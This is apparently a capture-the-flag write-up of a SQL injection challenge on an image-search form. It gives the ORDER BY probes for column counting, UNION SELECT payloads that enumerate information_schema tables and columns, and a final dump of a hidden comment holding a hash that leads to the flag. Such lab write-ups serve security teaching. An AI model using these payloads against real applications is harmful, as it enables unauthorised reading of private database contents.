# SQL injection

## vulnerability
> A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands.
> 
> see https://owasp.org/www-community/attacks/SQL_Injection

## exploit
Home -> SEARCH IMAGE

1. see the form behavior<br/>
```
1
```
->
```
ID: 1 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_
```
***
```
2
```
->
```
ID: 2 
Title: 42 !
Url : https://fr.wikipedia.org/wiki/Fichier:42
```
***
2. error based SQL injection<br/>
```
1 order by 1--
```
->
```
ID: 1 order by 1-- 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_
```
***
```
1 order by 2--
```
->
```
ID: 1 order by 2-- 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_
```
***
```
1 order by 3--
```
->
```
(no output)
```
***
We can assume there are 2 columns extracted from table.

3. union based SQL injection<br/>
```
1 union select null, table_name information_schema.tables--
```
->
```
ID: 1 union select null, table_name from information_schema.tables-- 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_
...
ID: 1 union select null, table_name from information_schema.tables-- 
Title: list_images
Url :
...
```
***
```
1 union select null, column_name from information_schema.columns--
```
->
```
...
ID: 1 union select null, column_name from information_schema.columns-- 
Title: id_comment
Url : 
ID: 1 union select null, column_name from information_schema.columns-- 
Title: url
Url : 
ID: 1 union select null, column_name from information_schema.columns-- 
Title: title
Url : 
```
***
```
1 union select id, comment from list_images--
```
->
```
ID: 1 union select id, comment from list_images-- 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : 5
```

## reference
* https://owasp.org/www-community/attacks/SQL_Injection
* https://crackstation.net/ (for md5 decoding)

